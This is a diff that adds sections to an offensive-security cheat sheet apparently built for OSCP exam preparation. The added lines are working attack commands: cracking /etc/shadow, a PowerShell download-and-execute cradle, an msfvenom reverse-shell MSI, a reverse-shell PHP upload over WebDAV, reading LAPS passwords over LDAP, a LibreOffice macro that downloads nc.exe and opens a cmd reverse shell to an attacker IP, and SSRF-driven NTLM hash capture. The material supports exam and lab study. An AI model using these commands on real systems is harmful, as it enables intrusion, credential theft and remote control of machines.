@@ -272,6 +272,11 @@ ssh2john id_rsa > ssh.hash
 # Convert and crack PDF hash
 pdf2john PDF.pdf > pdf_hash.txt    
 john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
+# Crack local shadow file (requires read access to both)
+cat /etc/passwd
+cat /etc/shadow
+unshadow passwd shadow > unshadowed.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.hash 
 ```
 
 ##### Cracking
@@ -773,9 +778,13 @@ type C:\Windows\System32\mimilsa.log
 ##### AlwaysInstallElevated
 
 ````ps1
+# Enum options
 # Check both registry keys are set to 1
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+# Load PowerUp.ps1 reflectively (no disk write)
+iex ([System.Net.WebClient]::new().DownloadString('http://IP/PowerUp.ps1'))
+Invoke-PrivEscAudit
 
 # Generate malicious MSI
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o malicious.msi
@@ -1276,6 +1285,21 @@ gobuster dns -d DOMAIN -w wordlist.txt -t 10
 
 [crt.sh](https://crt.sh)
 
+#### WebDAV (TCP: 80/443, path-based)
+
+```sh
+# Connect to WebDAV share interactively
+cadaver http://target.com/webdav
+
+# Inside cadaver session
+put reverse-shell.php
+get passwd.dav
+ls
+
+# Then trigger uploaded shell via browser
+# http://target.com/webdav/reverse-shell.php
+```
+
 #### SMB (TCP: 139, 445)
 
 ##### PowerShell
@@ -1552,6 +1576,8 @@ nxc ldap IP -u 'USER' -p 'PASS' --kerberoasting kerberoast.txt
 nxc ldap IP -u 'USER' -p 'PASS' --bloodhound -c All
 # Read LAPS password
 nxc ldap IP -u 'USER' -p 'PASSWORD' -M laps
+# Read LAPS password via raw ldapsearch (fallback if module unavailable)
+ldapsearch -v -x -D 'USER@DOMAIN' -w 'PASS' -b "DC=domain,DC=com" -h IP "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 
 #### Squid Proxy (TCP: 3128)
@@ -1777,6 +1803,26 @@ stty raw -echo; fg
 Enter
 ```
 
+##### LibreOffice/OpenOffice Macro
+
+```sh
+# Minimal test macro (LibreOffice Basic) to confirm execution
+REM  *****  BASIC  *****
+Sub Main
+    shell("ping -n 1 IP")
+End Sub
+
+# Reverse shell macro
+REM  *****  BASIC  *****
+Sub Main
+    Shell("certutil.exe -urlcache -split -f 'http://IP/nc.exe' 'C:\Windows\Temp\nc.exe'")
+    Shell("C:\Windows\Temp\nc.exe -e cmd IP PORT")
+End Sub
+
+# Save as .odt (or .ods if filtered), embed macro, upload to
+# any service that processes/opens Office documents server-side (mail, converters)
+```
+
 ### Tunneling
 
 #### Ligolo-NG
@@ -1808,11 +1854,14 @@ ifconfig
 interface_add_route --name ligolo --route FROM_IFCONFIG  
 start
 
-# Get localhost access
-# Make use of special route
-interface_add_route --name ligolo --route 240.0.0.1/32 
+# When target webapp/service only listens on its own 127.0.0.1,
+# the special 240.0.0.1 route (not the agent's real adapter) lets you
+# reach it through the tunnel as if you were local on the target
+interface_add_route --name ligolo --route 240.0.0.1/32
 route_list
-curl 240.0.0.1 
+curl 240.0.0.1
+# Interact with the localhost-only service through the tunnel
+http://240.0.0.1/?whoami
 
 # Webui credentials
 ligolo:password:http://127.0.0.1:8080
@@ -2071,6 +2120,17 @@ copy \\IP\share\file.exe C:\Temp\file.exe
 # or map
 net use Z: \\IP\share
 Z:\file.exe
+```
+
+##### SSRF → NTLM Capture via Responder
+
+```sh
+# When a webapp on domain controller has SSRF, point it at your Responder listener instead of scanning internal ports
+sudo responder -I tun0 -wv
+# Trigger SSRF request to your Kali IP on port 80
+http://TARGET/?url=http://KALI_IP:80/
+# Captured Net-NTLMv2 hash appears in Responder output; crack it
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 #### OSCP Exam Report Checklist (per box)
